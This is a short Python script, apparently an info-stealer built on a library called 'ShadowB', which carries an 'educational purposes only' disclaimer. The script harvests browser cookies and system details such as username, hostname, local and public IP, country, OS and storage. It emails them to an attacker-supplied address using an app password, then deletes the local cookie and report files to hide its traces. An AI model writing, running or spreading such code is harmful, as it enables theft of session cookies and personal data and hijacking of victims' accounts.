from ShadowB import system, timer, mail
from datetime import datetime
from random import randint
import os

# Don't use this code on a device you don't own (this code is for educational purposes only, any illegal use will get you into legal trouble)

#------ Fill in these blanks ---------
sender = "......"
app_password = "......"
to = "....."
#----------------------------
subject = "Data extraction"

rand_number = randint(10000,99999)
cookies_txt = ""
cookies = system.cookies("cookies")
with open("cookies.txt","r") as f:
    for data in f:
        cookies_txt += data + "\n"

timer.start()
message = f"""
        Operation number : {rand_number}
--------------------------------------------------------------        
Operation date : {datetime.now().strftime("%Y-%m-%d %H:%M")}

Username : {system.informations(False)[0]}\n
Hostname : {system.informations(False)[1]}\n
Local_ip : {system.informations(False)[2]}\n
Public_ip : {system.ip(False)[1]}\n
Country : {system.informations(False)[3]}\n
Os_name : {system.informations(False)[4]}\n
Os_release : {system.informations(False)[5]}\n
Arch : {system.informations(False)[6]}\n
Ram : {system.informations(False)[7]} GB\n
Total storage : {system.informations(False)[8]} GB\n
Used storage : {system.informations(False)[9]} GB\n
Free storage : {system.informations(False)[10]} GB\n
---------------------------------------------------------------
cookies :\n{cookies_txt}\n
---------------------------------------------------------------
The operation took : {timer.stop()} seconds. 
"""
system.remove_file("cookies.txt")

with open(f"{rand_number}.txt","w") as f:
    f.write(message)
    
    
statu = mail.send_msj(sender, app_password, to, subject, f"{rand_number}.txt")    
if statu == 200:
    system.remove_file(f"{rand_number}.txt")    